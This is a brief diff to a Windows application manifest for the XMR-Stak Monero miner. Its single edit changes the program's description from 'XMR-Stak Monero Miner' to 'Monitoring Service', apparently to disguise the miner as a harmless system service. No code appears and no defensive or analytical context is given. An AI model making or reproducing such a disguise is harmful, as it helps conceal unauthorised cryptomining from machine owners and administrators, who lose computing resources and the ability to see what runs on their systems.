@@ -6,7 +6,7 @@
     name="xmr-stak"
     type="win32"
 />
-    <description>XMR-Stak Monero Miner</description>
+    <description>Monitoring Service</description>
     <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
         <security>
             <requestedPrivileges>
